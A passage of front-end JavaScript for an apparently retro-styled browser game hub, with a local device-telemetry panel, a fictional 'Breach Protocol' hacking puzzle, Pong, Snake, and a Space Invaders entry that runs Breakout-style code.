//  HARDWARE MONITOR  (real browser APIs where available)
// =============================================================
function startMonitor() {
    stopAllGames();
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'SYSTEM TELEMETRY';

    // ── Gather real device data ──────────────────────────────────
    const cores    = navigator.hardwareConcurrency || '?';
    const ramHint  = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
    const conn     = navigator.connection;
    const hasHeap  = !!(window.performance && performance.memory);
    const connType = conn ? (conn.type || conn.effectiveType || '?') : 'N/A';
    const dlMbps   = conn?.downlink !== undefined ? conn.downlink : null;
    const scrn     = `${window.screen.width}×${window.screen.height}`;
    const dpr      = window.devicePixelRatio ? `@${window.devicePixelRatio}x` : '';

    let batPct = null, batChg = null;
    if (navigator.getBattery) {
        navigator.getBattery().then(b => {
            batPct = Math.round(b.level * 100); batChg = b.charging;
            b.onlevelchange     = () => { batPct = Math.round(b.level * 100); };
            b.onchargingchange  = () => { batChg = b.charging; };
            const v = document.getElementById('mon-bat-val');
            const s = document.getElementById('mon-bat-sub');
            if (v) v.textContent = batPct + '%';
            if (s) s.textContent = batChg ? 'CHARGING ⚡' : 'ON BATTERY';
        }).catch(() => {});
    }

    guiContent.innerHTML = `
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:5px;margin-bottom:6px;text-align:center;font-size:0.68rem;">
            <div style="border:1px solid #0ff;padding:5px 3px;background:rgba(0,255,255,0.05);">
                <div style="color:#0ff;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">CPU</div>
                <div style="color:#fff;font-size:0.95rem;font-weight:bold;">${cores}</div>
                <div style="color:#555;font-size:0.58rem;margin-top:2px;">CORES</div>
            </div>
            <div style="border:1px solid #f0f;padding:5px 3px;background:rgba(255,0,255,0.05);">
                <div style="color:#f0f;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">RAM</div>
                <div style="color:#fff;font-size:0.95rem;font-weight:bold;">${ramHint}</div>
                <div style="color:#555;font-size:0.58rem;margin-top:2px;">DEVICE</div>
            </div>
            <div style="border:1px solid #0f0;padding:5px 3px;background:rgba(0,255,0,0.05);">
                <div style="color:#0f0;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">NET</div>
                <div id="mon-net-val" style="color:#fff;font-size:0.9rem;font-weight:bold;">${dlMbps !== null ? dlMbps + 'Mb' : connType}</div>
                <div style="color:#555;font-size:0.58rem;margin-top:2px;">${dlMbps !== null ? 'DOWNLINK' : 'TYPE'}</div>
            </div>
            <div style="border:1px solid #ff0;padding:5px 3px;background:rgba(255,255,0,0.04);">
                <div style="color:#ff0;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">BATT</div>
                <div id="mon-bat-val" style="color:#fff;font-size:0.95rem;font-weight:bold;">${batPct !== null ? batPct + '%' : '—'}</div>
                <div id="mon-bat-sub" style="color:#555;font-size:0.58rem;margin-top:2px;">${batPct !== null ? (batChg ? 'CHARGING ⚡' : 'ON BATTERY') : 'N/A'}</div>
            </div>
        </div>
        <div style="color:#252525;font-size:0.6rem;text-align:right;margin-bottom:4px;padding:0 2px;">${scrn}${dpr} · ${connType} · ${navigator.language||'?'} · ${hasHeap ? 'heap API' : 'est'}</div>`;

    nexusCanvas.style.display = 'block';
    nexusCanvas.width = 400; nexusCanvas.height = 165;
    const ctx = nexusCanvas.getContext('2d');

    let prevIntervalMs = performance.now();

    clearInterval(monitorInterval);
    monitorInterval = setInterval(() => {
        // ── Real data ────────────────────────────────────────────
        // CPU proxy: measure interval overshoot (browser busyness)
        const nowMs = performance.now();
        const elapsed = nowMs - prevIntervalMs;
        prevIntervalMs = nowMs;
        // Expected: 400ms. Overshoot means main thread was busy.
        const cpuLoad = Math.min(95, Math.max(5, 10 + ((elapsed - 400) / 400) * 80 + Math.random() * 8));

        // Memory: real JS heap (Chrome) or device memory hint fallback
        let memPct;
        if (hasHeap) {
            memPct = Math.min(99, (performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100);
        } else {
            memPct = 30 + Math.random() * 12; // estimated
        }

        // Network: real downlink reading
        const freshDl = navigator.connection?.downlink;
        const netPct  = freshDl !== undefined
            ? Math.min(100, (freshDl / 100) * 100) // normalize against 100Mbps
            : 15 + Math.random() * 20;

        // Update live readouts
        const netEl = document.getElementById('mon-net-val');
        if (netEl && freshDl !== undefined) netEl.textContent = freshDl.toFixed(1) + 'Mb';
        const batV = document.getElementById('mon-bat-val');
        const batS = document.getElementById('mon-bat-sub');
        if (batV && batPct !== null) batV.textContent = batPct + '%';
        if (batS && batPct !== null) batS.textContent = batChg ? 'CHARGING ⚡' : 'ON BATTERY';

        cpuHistory.push(cpuLoad);
        memHistory.push(memPct);
        netHistory.push(netPct);
        [cpuHistory, memHistory, netHistory].forEach(h => { if (h.length > 50) h.shift(); });

        // ── Draw sparklines ──────────────────────────────────────
        const W = 400, H = 165;
        ctx.fillStyle = '#0a0a15';
        ctx.fillRect(0, 0, W, H);

        const sections = [
            { label: 'CPU LOAD', note: 'thread est', data: cpuHistory, color: '#0ff', yBase: 52,  maxVal: 100 },
            { label: 'MEMORY',   note: hasHeap ? 'js heap' : 'est',   data: memHistory, color: '#f0f', yBase: 107, maxVal: 100 },
            { label: 'NETWORK',  note: freshDl !== undefined ? 'live' : 'est', data: netHistory, color: '#0f0', yBase: 162, maxVal: 100 },
        ];
        const sectionH = 52;

        sections.forEach(({ label, note, data, color, yBase }) => {
            const top = yBase - sectionH + 2;

            ctx.fillStyle = color + '08';
            ctx.fillRect(0, top, W, sectionH - 2);

            ctx.fillStyle = color;
            ctx.font = 'bold 8px monospace';
            ctx.fillText(label, 6, top + 11);
            ctx.fillStyle = '#333';
            ctx.font = '7px monospace';
            ctx.fillText(`[${note}]`, 7 + ctx.measureText(label).width + 4, top + 11);

            if (data.length > 1) {
                ctx.strokeStyle = color; ctx.lineWidth = 1.5;
                ctx.beginPath();
                data.forEach((v, i) => {
                    const x = (i / 50) * W;
                    const y = yBase - 4 - ((v / 100) * (sectionH - 16));
                    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
                });
                ctx.stroke();
                // Fill under
                ctx.beginPath();
                data.forEach((v, i) => {
                    const x = (i / 50) * W;
                    const y = yBase - 4 - ((v / 100) * (sectionH - 16));
                    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
                });
                ctx.lineTo((data.length - 1) / 50 * W, yBase - 4);
                ctx.lineTo(0, yBase - 4);
                ctx.closePath();
                ctx.fillStyle = color + '16';
                ctx.fill();
            }

            const last = data[data.length - 1];
            if (last !== undefined) {
                ctx.fillStyle = color; ctx.font = '8px monospace';
                ctx.fillText(last.toFixed(1) + '%', W - 46, top + 11);
            }

            ctx.strokeStyle = color + '33'; ctx.lineWidth = 1;
            ctx.beginPath(); ctx.moveTo(0, yBase); ctx.lineTo(W, yBase); ctx.stroke();
        });
    }, 400);
}

// =============================================================
//  BREACH PROTOCOL (Hacking Game)
// =============================================================
let breachActive = false, _breachClick = null;

function startBreach() {
    stopAllGames();
    breachActive = true;
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'BREACH PROTOCOL';
    
    const hexCodes = ['E9', '1C', '55', 'BD', '7A', 'FF', 'F0'];
    const grid = [];
    for(let i=0; i<25; i++) grid.push(hexCodes[Math.floor(Math.random() * hexCodes.length)]);
    
    const sequence = [];
    for(let i=0; i<3; i++) sequence.push(grid[Math.floor(Math.random() * grid.length)]);
    
    let currentInput = [];
    let timeLeft = 30;
    
    guiContent.innerHTML = `
        <div style="text-align:center;">
            <div style="color:#0f0;font-size:0.75rem;margin-bottom:8px;">REQUIRED SEQUENCE: <b style="color:#fff;letter-spacing:2px;">${sequence.join(' ')}</b></div>
            <div id="breach-grid" style="display:grid;grid-template-columns:repeat(5, 1fr);gap:8px;max-width:250px;margin:0 auto;">
                ${grid.map((hex, i) => `<button class="gui-btn breach-tile" data-idx="${i}" style="margin:0;padding:8px;font-size:0.8rem;border-color:#333;">${hex}</button>`).join('')}
            </div>
            <div id="breach-timer" style="margin-top:12px;color:#f00;font-weight:bold;">${timeLeft}s</div>
        </div>`;
    
    const timer = setInterval(() => {
        if (!breachActive) { clearInterval(timer); return; }
        timeLeft--;
        const el = document.getElementById('breach-timer');
        if (el) el.textContent = timeLeft + 's';
        if (timeLeft <= 0) {
            clearInterval(timer);
            if (breachActive) {
                printToTerminal('[FAIL] Breach Timeout. ICE reset.', 'sys-msg');
                stopAllGames();
                guiContainer.classList.add('gui-hidden');
            }
        }
    }, 1000);

    guiContent.querySelectorAll('.breach-tile').forEach(btn => {
        btn.onclick = () => {
            const hex = btn.textContent;
            btn.style.borderColor = '#0f0';
            btn.style.color = '#0f0';
            btn.disabled = true;
            currentInput.push(hex);
            
            // Check sequence
            const match = currentInput.every((h, idx) => h === sequence[idx]);
            if (!match) {
                printToTerminal('[FAIL] Sequence Mismatch. Alarm Triggered.', 'sys-msg');
                stopAllGames();
                guiContainer.classList.add('gui-hidden');
            } else if (currentInput.length === sequence.length) {
                printToTerminal('[OK] Neural link established. Admin access granted.', 'conn-ok');
                clearInterval(timer);
                breachActive = false;
                guiContent.innerHTML = '<h2 style="color:#0f0;">ACCESS GRANTED</h2><p style="color:#888;">System bypassed successfully.</p>';
            }
        };
    });
}

// =============================================================
//  PONG
// =============================================================
function startPong() {
    stopAllGames();
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'NEXUS PONG // CAMPAIGN';

    guiContent.innerHTML = `
        <div style="text-align:center;padding:10px 0;">
            <div style="color:#0ff;letter-spacing:3px;font-size:0.8rem;margin-bottom:16px;">SELECT DIFFICULTY</div>
            <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
                <button class="gui-btn pong-diff" data-diff="easy"   style="border-color:#0f0;color:#0f0;">EASY</button>
                <button class="gui-btn pong-diff" data-diff="medium" style="border-color:#ff0;color:#ff0;">MEDIUM</button>
                <button class="gui-btn pong-diff" data-diff="hard"   style="border-color:#f0f;color:#f0f;">HARD</button>
            </div>
            <p style="color:#555;font-size:0.68rem;margin-top:14px;">Defeat the AI to advance to higher levels!</p>
        </div>`;
    nexusCanvas.style.display = 'none';

    guiContent.querySelectorAll('.pong-diff').forEach(btn => {
        btn.addEventListener('click', () => launchPong(btn.dataset.diff));
    });
}

function launchPong(difficulty) {
    const DIFF = {
        easy:   { aiSpeed: 2,   interval: 20, imprecision: 80, ballSpeed: 4   },
        medium: { aiSpeed: 3.5, interval: 14, imprecision: 45, ballSpeed: 5   },
        hard:   { aiSpeed: 5,   interval:  8, imprecision: 20, ballSpeed: 6.5 },
    };
    let d = { ...DIFF[difficulty] || DIFF.medium };
    const WIN_SCORE = 5;

    let level = 1;
    let PADDLE_H = 75, PADDLE_W = 10;
    
    function updateUI() {
        guiContent.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center;padding:0 20px 6px;font-size:0.75rem;">
                <span style="color:#0ff;">YOU</span>
                <span style="color:#444;font-size:0.65rem;letter-spacing:1px;">LEVEL ${level} · First to ${WIN_SCORE}</span>
                <span style="color:#88f;">CPU</span>
            </div>`;
    }
    updateUI();

    nexusCanvas.style.display = 'block';
    nexusCanvas.width = 400; nexusCanvas.height = 300;
    const ctx = nexusCanvas.getContext('2d');

    const stars = Array.from({length: 60}, () => ({
        x: Math.random()*400, y: Math.random()*300, r: Math.random()*1.2 + 0.3, a: Math.random()*0.5 + 0.1
    }));

    const FPS = 60, STEP = 1000 / FPS;
    let last = 0;
    let paddleY = 112, ballX = 200, ballY = 150;
    let ballVX = d.ballSpeed, ballVY = 3;
    let aiY = 112, pScore = 0, aScore = 0;
    let aiTargetY = 150, aiTick = 0;
    let gameEnded = false;

    const move = (y) => {
        const r = nexusCanvas.getBoundingClientRect();
        paddleY = Math.max(0, Math.min(300 - PADDLE_H, (y - r.top) * (300 / r.height) - PADDLE_H / 2));
    };
    nexusCanvas.onmousemove = (e) => { if (!gameEnded) move(e.clientY); };
    nexusCanvas.ontouchmove = (e) => { if (!gameEnded) { e.preventDefault(); move(e.touches[0].clientY); } };

    function resetBall(dir) {
        ballX = 200; ballY = 60 + Math.random() * 180;
        ballVX = (dir || (Math.random() > 0.5 ? 1 : -1)) * d.ballSpeed;
        ballVY = (Math.random() > 0.5 ? 1 : -1) * (2.5 + Math.random() * 1.5);
        aiTick = 0;
    }

    function drawEnd(playerWon) {
        if (playerWon) {
            // Level up!
            level++;
            pScore = 0; aScore = 0;
            PADDLE_H = Math.max(30, PADDLE_H - 10);
            d.ballSpeed += 1;
            d.aiSpeed += 1;
            d.imprecision = Math.max(0, d.imprecision - 10);
            updateUI();
            resetBall(-1);
            SoundManager.playBloop(800, 0.2);
            return;
        }
        
        const r = pongRaf; pongRaf = null; cancelAnimationFrame(r);
        gameEnded = true;

        SoundManager.playBloop(150, 0.2);
        submitScore('pong', level * 100);

        ctx.fillStyle = '#030308'; ctx.fillRect(0, 0, 400, 300);
        stars.forEach(s => { ctx.fillStyle = `rgba(255,255,255,${s.a})`; ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI*2); ctx.fill(); });

        ctx.fillStyle = 'rgba(20,0,0,0.88)'; ctx.fillRect(0, 0, 400, 300);
        ctx.strokeStyle = '#f44'; ctx.lineWidth = 2; ctx.strokeRect(20, 70, 360, 160);

        ctx.textAlign = 'center';
        ctx.fillStyle = '#f44'; ctx.font = 'bold 30px monospace';
        ctx.fillText('DEFEATED', 200, 118);
        ctx.fillStyle = '#fff'; ctx.font = '15px monospace';
        ctx.fillText(`REACHED LEVEL ${level}`, 200, 150);
        ctx.fillStyle = '#0ff'; ctx.font = '11px monospace';
        ctx.fillText('CLICK to retry', 200, 204);
        ctx.textAlign = 'left';

        nexusCanvas.onclick = () => { nexusCanvas.onclick = null; launchPong(difficulty); };
    }

    function tick(ts) {
        if (!pongRaf) return;
        const delta = ts - last;
        if (delta < STEP - 2) { pongRaf = requestAnimationFrame(tick); return; }
        last = ts;

        aiTick++;
        if (aiTick % d.interval === 0) aiTargetY = ballY - PADDLE_H / 2 + (Math.random() - 0.5) * d.imprecision;
        if (aiY < aiTargetY) aiY = Math.min(aiY + d.aiSpeed, aiTargetY);
        else                  aiY = Math.max(aiY - d.aiSpeed, aiTargetY);
        aiY = Math.max(0, Math.min(300 - PADDLE_H, aiY));

        ballX += ballVX; ballY += ballVY;
        if (ballY <= 4)   { ballVY =  Math.abs(ballVY); ballY = 5; }
        if (ballY >= 296) { ballVY = -Math.abs(ballVY); ballY = 295; }

        const pRight = 8 + PADDLE_W;
        if (ballVX < 0 && ballX - 5 <= pRight && ballX + 5 >= 8 && ballY + 5 > paddleY && ballY - 5 < paddleY + PADDLE_H) {
            ballVX = Math.abs(ballVX) * 1.05;
            ballVY += ((ballY - (paddleY + PADDLE_H / 2)) / (PADDLE_H / 2)) * 2.5;
            ballVY = Math.max(-9, Math.min(9, ballVY));
            ballX = pRight + 6;
        }
        const aiLeft = 382;
        if (ballVX > 0 && ballX + 5 >= aiLeft && ballX - 5 <= aiLeft + PADDLE_W && ballY + 5 > aiY && ballY - 5 < aiY + PADDLE_H) {
            ballVX = -Math.abs(ballVX) * 1.05;
            ballVY += ((ballY - (aiY + PADDLE_H / 2)) / (PADDLE_H / 2)) * 1.5;
            ballVY = Math.max(-9, Math.min(9, ballVY));
            ballX = aiLeft - 6;
        }

        if (ballX < 0)   { aScore++; if (aScore >= WIN_SCORE) { drawEnd(false); return; } resetBall(1); }
        if (ballX > 400) { pScore++; if (pScore >= WIN_SCORE) { drawEnd(true);  return; } resetBall(-1); }

        ctx.fillStyle = '#030308'; ctx.fillRect(0, 0, 400, 300);
        stars.forEach(s => { ctx.fillStyle = `rgba(255,255,255,${s.a})`; ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI*2); ctx.fill(); });

        ctx.setLineDash([8, 8]);
        ctx.strokeStyle = 'rgba(0,255,255,0.12)'; ctx.lineWidth = 1;
        ctx.beginPath(); ctx.moveTo(200, 0); ctx.lineTo(200, 300); ctx.stroke();
        ctx.setLineDash([]);

        ctx.fillStyle = 'rgba(0,255,255,0.55)'; ctx.font = 'bold 26px monospace'; ctx.textAlign = 'center';
        ctx.fillText(pScore, 90, 34); ctx.fillText(aScore, 310, 34);
        ctx.textAlign = 'left';

        for (let i = 0; i < WIN_SCORE; i++) {
            ctx.fillStyle = i < pScore ? '#0ff' : 'rgba(0,255,255,0.12)';
            ctx.beginPath(); ctx.arc(22 + i * 18, 46, 4, 0, Math.PI*2); ctx.fill();
            ctx.fillStyle = i < aScore ? '#88f' : 'rgba(136,136,255,0.12)';
            ctx.beginPath(); ctx.arc(378 - i * 18, 46, 4, 0, Math.PI*2); ctx.fill();
        }

        ctx.shadowBlur = 12;
        ctx.shadowColor = '#0ff'; ctx.fillStyle = '#0ff';
        ctx.fillRect(8, paddleY, PADDLE_W, PADDLE_H);
        ctx.shadowColor = '#88f'; ctx.fillStyle = '#88f';
        ctx.fillRect(382, aiY, PADDLE_W, PADDLE_H);
        ctx.shadowColor = '#f0f'; ctx.fillStyle = '#f0f';
        ctx.beginPath(); ctx.arc(ballX, ballY, 6, 0, Math.PI * 2); ctx.fill();
        ctx.shadowBlur = 0;

        pongRaf = requestAnimationFrame(tick);
    }
    pongRaf = requestAnimationFrame(tick);
}

function stopPong() { const r = pongRaf; pongRaf = null; cancelAnimationFrame(r); }

// =============================================================
//  SNAKE
// =============================================================

let snakeActive = false;
let _snakeTS = null, _snakeTE = null, _snakeKey = null;

function startSnake() {
    stopAllGames();
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'NEXUS SNAKE';
    nexusCanvas.style.display = 'none';

    guiContent.innerHTML = `
        <div style="text-align:center;padding:10px 0;">
            <div style="color:#0ff;letter-spacing:3px;font-size:0.8rem;margin-bottom:16px;">SELECT MODE</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;max-width:300px;margin:0 auto;">
                <button class="gui-btn snake-mode" data-mode="classic" style="border-color:#0ff;color:#0ff;">CLASSIC</button>
                <button class="gui-btn snake-mode" data-mode="speed"   style="border-color:#ff0;color:#ff0;">SPEED RUN</button>
                <button class="gui-btn snake-mode" data-mode="endless" style="border-color:#0f0;color:#0f0;">ENDLESS</button>
                <button class="gui-btn snake-mode" data-mode="stealth" style="border-color:#888;color:#888;">STEALTH</button>
            </div>
            <div style="color:#333;font-size:0.65rem;margin-top:16px;line-height:1.8;">
                <span style="color:#0ff">CLASSIC:</span> Walls kill. Standard.<br>
                <span style="color:#ff0">SPEED:</span> Gets faster every apple.<br>
                <span style="color:#0f0">ENDLESS:</span> Screen wrap enabled.<br>
                <span style="color:#888">STEALTH:</span> Snake body fades out!
            </div>
        </div>`;

    guiContent.querySelectorAll('.snake-mode').forEach(btn => {
        btn.addEventListener('click', () => launchSnake(btn.dataset.mode));
    });
}

function launchSnake(mode) {
    stopAllGames();
    snakeActive = true;
    guiContent.innerHTML = `<div style="display:flex;justify-content:space-between;padding:0 20px 6px;font-size:0.75rem;"><span style="color:#0ff;">Score: <b id="snake-score">0</b></span><span style="color:#444;font-size:0.65rem;letter-spacing:1px;">${mode.toUpperCase()}</span></div>`;
    nexusCanvas.style.display = 'block';
    nexusCanvas.width = 400; nexusCanvas.height = 300;
    const ctx = nexusCanvas.getContext('2d');

    const gridSize = 10;
    let snake = [{ x: 200, y: 150 }];
    let apple = { x: 300, y: 150 };
    let dx = gridSize, dy = 0;
    let score = 0, frames = 0, maxFrames = mode === 'speed' ? 10 : 8;
    let dead = false;
    
    // Stealth mode logic
    let stealthTimer = 0;

    _snakeKey = (e) => {
        if (!snakeActive) return;
        if (dead && e.key === ' ') { launchSnake(mode); return; }
        if (e.key === 'ArrowUp' && dy === 0)    { dx = 0; dy = -gridSize; }
        if (e.key === 'ArrowDown' && dy === 0)  { dx = 0; dy = gridSize; }
        if (e.key === 'ArrowLeft' && dx === 0)  { dx = -gridSize; dy = 0; }
        if (e.key === 'ArrowRight' && dx === 0) { dx = gridSize; dy = 0; }
    };
    document.removeEventListener('keydown', _snakeKey); document.addEventListener('keydown', _snakeKey);

    let tsX = 0, tsY = 0;
    _snakeTS = (e) => { tsX = e.touches[0].clientX; tsY = e.touches[0].clientY; };
    _snakeTE = (e) => {
        if (dead) { launchSnake(mode); return; }
        if (!tsX || !tsY) return;
        const x = e.changedTouches[0].clientX, y = e.changedTouches[0].clientY;
        const diffX = x - tsX, diffY = y - tsY;
        if (Math.abs(diffX) > Math.abs(diffY)) {
            if (diffX > 0 && dx === 0) { dx = gridSize; dy = 0; } else if (diffX < 0 && dx === 0) { dx = -gridSize; dy = 0; }
        } else {
            if (diffY > 0 && dy === 0) { dx = 0; dy = gridSize; } else if (diffY < 0 && dy === 0) { dx = 0; dy = -gridSize; }
        }
        tsX = 0; tsY = 0;
    };
    nexusCanvas.addEventListener('touchstart', _snakeTS);
    nexusCanvas.addEventListener('touchend', _snakeTE);

    function spawnApple() {
        apple.x = Math.floor(Math.random() * (400 / gridSize)) * gridSize;
        apple.y = Math.floor(Math.random() * (300 / gridSize)) * gridSize;
        // Prevent spawn on snake
        if (snake.some(s => s.x === apple.x && s.y === apple.y)) spawnApple();
    }

    function frame() {
        if (!snakeActive) return;
        if (dead) {
            ctx.fillStyle = 'rgba(255,0,0,0.5)'; ctx.fillRect(0,0,400,300);
            ctx.fillStyle = '#fff'; ctx.font = 'bold 24px monospace'; ctx.textAlign = 'center';
            ctx.fillText('CRITICAL ERROR', 200, 150);
            ctx.font = '14px monospace'; ctx.fillText('TAP or SPACE to retry', 200, 190);
            ctx.textAlign = 'left';
            return;
        }

        snakeRaf = requestAnimationFrame(frame);
        if (++frames < maxFrames) return;
        frames = 0;

        const head = { x: snake[0].x + dx, y: snake[0].y + dy };

        // Game mode boundary rules
        if (mode === 'endless') {
            if (head.x < 0) head.x = 400 - gridSize;
            else if (head.x >= 400) head.x = 0;
            if (head.y < 0) head.y = 300 - gridSize;
            else if (head.y >= 300) head.y = 0;
        } else {
            if (head.x < 0 || head.x >= 400 || head.y < 0 || head.y >= 300) dead = true;
        }

        // Body collision
        if (snake.some(segment => segment.x === head.x && segment.y === head.y)) dead = true;

        if (dead) { 
            submitScore(`snake_${mode}`, score); 
            showLeaderboard(`snake_${mode}`);
            SoundManager.playBloop(150, 0.2); 
            return; 
        }

        snake.unshift(head);

        if (head.x === apple.x && head.y === apple.y) {
            score++;
            const sEl = document.getElementById('snake-score'); if (sEl) sEl.textContent = score;
            spawnApple();
            SoundManager.playBloop(600, 0.05);
            if (mode === 'speed') maxFrames = Math.max(3, maxFrames - 0.2);
            if (mode === 'stealth') stealthTimer = 30; // 30 frames of stealth
        } else {
            snake.pop();
        }
        
        if (stealthTimer > 0) stealthTimer--;

        // Draw Lush Emerald Tiles (Mobile Game Style)
        const tileSize = 25;
        for(let x=0; x<400; x+=tileSize) {
            for(let y=0; y<300; y+=tileSize) {
                ctx.fillStyle = ((x+y)/tileSize) % 2 === 0 ? '#0a1a0a' : '#081408';
                ctx.fillRect(x, y, tileSize, tileSize);
            }
        }
        // Glowing Border
        ctx.strokeStyle = '#0f0'; ctx.lineWidth = 2; ctx.strokeRect(0,0,400,300);
        ctx.shadowBlur = 15; ctx.shadowColor = '#0f0'; ctx.strokeRect(0,0,400,300); ctx.shadowBlur = 0;
        ctx.strokeStyle = 'rgba(0, 255, 255, 0.03)';
        ctx.lineWidth = 0.5;
        for(let x=0; x<400; x+=20) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,300); ctx.stroke(); }
        for(let y=0; y<300; y+=20) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(400,y); ctx.stroke(); }
        
        // Mode-specific flourishes
        if (mode === 'speed') {
            ctx.fillStyle = 'rgba(255, 255, 0, 0.02)';
            ctx.fillRect(0, 0, 400, 300);
        } else if (mode === 'stealth') {
            ctx.fillStyle = 'rgba(100, 100, 100, 0.02)';
            ctx.fillRect(0, 0, 400, 300);
        }
        ctx.fillStyle = mode === 'speed' ? '#ff0' : mode === 'endless' ? '#0f0' : mode === 'stealth' ? '#888' : '#0ff';
        
        snake.forEach((segment, i) => {
            if (mode === 'stealth' && stealthTimer > 0 && i !== 0) return; // Hide body in stealth
            ctx.fillRect(segment.x, segment.y, gridSize, gridSize);
        });

        ctx.fillStyle = '#f0f'; ctx.shadowBlur = 10; ctx.shadowColor = '#f0f';
        ctx.fillRect(apple.x, apple.y, gridSize - 1, gridSize - 1);
        ctx.shadowBlur = 0;
    }
    frame();
}

function stopSnake() {
    snakeActive = false;
    cancelAnimationFrame(snakeRaf);
    if (_snakeKey) { document.removeEventListener('keydown', _snakeKey); _snakeKey = null; }
    if (_snakeTS)  { nexusCanvas.removeEventListener('touchstart', _snakeTS); _snakeTS = null; }
    if (_snakeTE)  { nexusCanvas.removeEventListener('touchend',   _snakeTE); _snakeTE = null; }
}

// =============================================================
//  SPACE INVADERS
// =============================================================
let invadersActive = false;
let _invadersKeys = {}, _invadersKeyDown = null, _invadersKeyUp = null;

function startInvaders() {
    stopAllGames();
    invadersActive = true;
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'SPACE INVADERS // NEXUS EDITION';
    nexusCanvas.style.display = 'none';

    guiContent.innerHTML = `
        <div style="text-align:center;padding:10px 0;">
            <div style="color:#0ff;letter-spacing:3px;font-size:0.8rem;margin-bottom:16px;">SELECT DIFFICULTY</div>
            <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
                <button class="gui-btn inv-diff" data-diff="easy"   style="border-color:#0f0;color:#0f0;">EASY</button>
                <button class="gui-btn inv-diff" data-diff="medium" style="border-color:#ff0;color:#ff0;">MEDIUM</button>
                <button class="gui-btn inv-diff" data-diff="hard"   style="border-color:#f0f;color:#f0f;">HARD</button>
            </div>
            <p style="color:#555;font-size:0.68rem;margin-top:14px;">← → to move &nbsp;·&nbsp; Space to fire</p>
        </div>`;

    guiContent.querySelectorAll('.inv-diff').forEach(btn => {
        btn.addEventListener('click', () => launchInvaders(btn.dataset.diff));
    });
}

function launchInvaders(difficulty) {
    const DIFFS = {
        easy:   { PW: 110, startVX: 1.8, startVY: -3.0, accel: 1.00, maxLives: 6 },
        medium: { PW: 85,  startVX: 2.5, startVY: -4.0, accel: 1.02, maxLives: 4 },
        hard:   { PW: 55,  startVX: 3.5, startVY: -5.5, accel: 1.05, maxLives: 3 },
        insane: { PW: 45,  startVX: 4.0, startVY: -6.5, accel: 1.08, maxLives: 2 },
    };
    const d = DIFFS[difficulty] || DIFFS.medium;

    breakoutActive = true;
    let currentPW = d.PW;
    guiContent.innerHTML = `
        <div style="display:flex;justify-content:space-between;padding:0 10px 4px;font-size:0.72rem;">
            <span style="color:#0ff;">Score: <b id="brk-score">0</b></span>
            <span style="color:#f0f;font-size:0.65rem;letter-spacing:1px;">LEVEL <span id="brk-level">1</span></span>
            <div style="width:100px;height:8px;background:#222;border:1px solid #444;border-radius:4px;overflow:hidden;margin-top:4px;"><div id="brk-health" style="width:100%;height:100%;background:linear-gradient(to right, #f0f, #0ff); box-shadow: 0 0 10px #0ff;;transition:width 0.3s;"></div></div>
        </div>`;
    nexusCanvas.style.display = 'block';
    nexusCanvas.width = 400; nexusCanvas.height = 300;
    const ctx = nexusCanvas.getContext('2d');

    const PH = 10, BR = 7;
    const BW = 43, BH = 16, BCOLS = 8, BROWS = 5;
    const BCOLORS = ['#f0f','#f55','#f80','#ff0','#0f0'];
    let paddle = 165;
    let balls = [{ x: 200, y: 230, vx: d.startVX, vy: d.startVY }];
    let powerups = [];
    const PU_TYPES = [
        { label: 'M', color: '#0ff', type: 'multi' },
        { label: 'W', color: '#0f0', type: 'wide' },
        { label: 'S', color: '#ff0', type: 'slow' }
    ];

    let bricks = [], score = 0, lives = d.maxLives, level = 1, dead = false, won = false;
    let lastTs = 0, wideTimer = 0;
    
    function initBricks() {
        bricks = [];
        balls = [{ x: 200, y: 230, vx: d.startVX * (1 + level*0.1), vy: d.startVY * (1 + level*0.1) }];
        powerups = [];
        currentPW = d.PW;
        
        for (let r = 0; r < BROWS + Math.floor(level/2); r++) {
            for (let c = 0; c < BCOLS; c++) {
                // Introduce gaps and steel bricks at higher levels
                if (level > 1 && (r + c) % 5 === 0) continue; 
                let hp = 1;
                if (level > 2 && Math.random() < 0.1) hp = 2; // Steel brick
                bricks.push({ x: 8 + c * (BW + 4), y: 30 + r * (BH + 5), alive: true, hp: hp, color: hp === 2 ? '#aaa' : BCOLORS[r % BCOLORS.length] });
            }
        }
    }
    initBricks();

    const movePaddle = (cx) => {
        const rect = nexusCanvas.getBoundingClientRect();
        paddle = ((cx - rect.left) / rect.width) * 400 - currentPW / 2;
        paddle = Math.max(0, Math.min(400 - currentPW, paddle));
    };
    nexusCanvas.onmousemove = (e) => movePaddle(e.clientX);
    nexusCanvas.ontouchmove = (e) => { e.preventDefault(); movePaddle(e.touches[0].clientX); };

    function frame(ts) {
        if (!breakoutActive) return;
        const raw = lastTs ? Math.min(ts - lastTs, 50) : 16.67;
        const dt  = raw / 16.67;
        lastTs = ts;

        if (!dead && !won) {
            if (wideTimer > 0) {
                wideTimer -= raw;
                if (wideTimer <= 0) currentPW = d.PW;
            }

            balls.forEach((ball, bi) => {
                ball.x += ball.vx * dt; ball.y += ball.vy * dt;
                if (ball.x <= BR || ball.x >= 400 - BR) { ball.vx *= -1; SoundManager.playBloop(300, 0.02); }
                if (ball.y <= BR) { ball.vy = Math.abs(ball.vy); SoundManager.playBloop(300, 0.02); }
                
                if (ball.y + BR >= 270 && ball.y - BR <= 282 && ball.x >= paddle && ball.x <= paddle + currentPW) {
                    ball.vy = -Math.abs(ball.vy);
